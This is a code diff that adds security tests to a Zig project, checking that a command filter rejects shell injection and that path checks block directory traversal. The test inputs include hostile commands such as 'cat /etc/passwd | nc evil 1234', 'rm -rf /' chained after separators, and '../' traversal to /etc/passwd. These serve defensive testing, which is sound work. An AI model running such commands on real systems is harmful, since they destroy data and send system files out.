@@ -1,5 +1,7 @@
 const std = @import("std");
 const commands = @import("security/commands.zig");
+const paths = @import("security/paths.zig");
+const fs_util = @import("util/fs.zig");
 const pairing = @import("security/pairing.zig");
 const config = @import("config.zig");
 
@@ -19,6 +21,87 @@ test "commands.isCommandSafe denies separators" {
     try std.testing.expect(commands.isCommandSafe("ls -la"));
     try std.testing.expect(!commands.isCommandSafe("ls; rm -rf /"));
     try std.testing.expect(!commands.isCommandSafe("echo hi && whoami"));
+}
+
+test "commands.isCommandSafe allowlist rejects injection vectors" {
+    // Backticks
+    try std.testing.expect(!commands.isCommandSafe("echo `whoami`"));
+    // Dollar-paren
+    try std.testing.expect(!commands.isCommandSafe("echo $(id)"));
+    // Dollar-brace
+    try std.testing.expect(!commands.isCommandSafe("echo ${HOME}"));
+    // Pipe
+    try std.testing.expect(!commands.isCommandSafe("cat /etc/passwd | nc evil 1234"));
+    // Redirect
+    try std.testing.expect(!commands.isCommandSafe("echo pwned > /tmp/x"));
+    // Newline
+    try std.testing.expect(!commands.isCommandSafe("echo hi\nrm -rf /"));
+    // Null byte
+    try std.testing.expect(!commands.isCommandSafe("echo\x00evil"));
+    // Empty
+    try std.testing.expect(!commands.isCommandSafe(""));
+    // Allowed: typical wasmtime invocation
+    try std.testing.expect(commands.isCommandSafe("wasmtime run --mapdir /workspace=/home/user/project plugin.wasm"));
+}
+
+test "fs_util.resolveComponents normalizes paths" {
+    const a = std.testing.allocator;
+
+    // Basic normalization
+    const p1 = try fs_util.resolveComponents(a, "/workspace/../../../etc/passwd");
+    defer a.free(p1);
+    try std.testing.expectEqualStrings("/etc/passwd", p1);
+
+    // Dot removal
+    const p2 = try fs_util.resolveComponents(a, "/workspace/./foo/./bar");
+    defer a.free(p2);
+    try std.testing.expectEqualStrings("/workspace/foo/bar", p2);
+
+    // Redundant separators
+    const p3 = try fs_util.resolveComponents(a, "/workspace///foo//bar");
+    defer a.free(p3);
+    try std.testing.expectEqualStrings("/workspace/foo/bar", p3);
+
+    // Parent at root collapses to root
+    const p4 = try fs_util.resolveComponents(a, "/../../../");
+    defer a.free(p4);
+    try std.testing.expectEqualStrings("/", p4);
+
+    // Just root
+    const p5 = try fs_util.resolveComponents(a, "/");
+    defer a.free(p5);
+    try std.testing.expectEqualStrings("/", p5);
+
+    // Empty path is error
+    try std.testing.expectError(error.EmptyPath, fs_util.resolveComponents(a, ""));
+}
+
+test "paths.isPathUnder blocks traversal attacks" {
+    const a = std.testing.allocator;
+
+    // Direct traversal: /workspace/../../../etc/passwd -> /etc/passwd (not under /workspace)
+    try std.testing.expectError(error.PathOutsideRoot, paths.isPathUnder(a, "/workspace", "/workspace/../../../etc/passwd"));
+
+    // Prefix confusion: /workspaced is not under /workspace
+    try std.testing.expectError(error.PathOutsideRoot, paths.isPathUnder(a, "/workspace", "/workspaced/secret"));
+
+    // Valid paths should succeed
+    const v1 = try paths.isPathUnder(a, "/workspace", "/workspace/README.md");
+    defer a.free(v1);
+    try std.testing.expectEqualStrings("/workspace/README.md", v1);
+
+    // Exact root match
+    const v2 = try paths.isPathUnder(a, "/workspace", "/workspace");
+    defer a.free(v2);
+    try std.testing.expectEqualStrings("/workspace", v2);
+
+    // Nested valid path with dot components
+    const v3 = try paths.isPathUnder(a, "/workspace", "/workspace/./src/../src/main.zig");
+    defer a.free(v3);
+    try std.testing.expectEqualStrings("/workspace/src/main.zig", v3);
+
+    // Completely unrelated path
+    try std.testing.expectError(error.PathOutsideRoot, paths.isPathUnder(a, "/workspace", "/etc/passwd"));
 }
 
 test "pairing.constantTimeEq basic" {
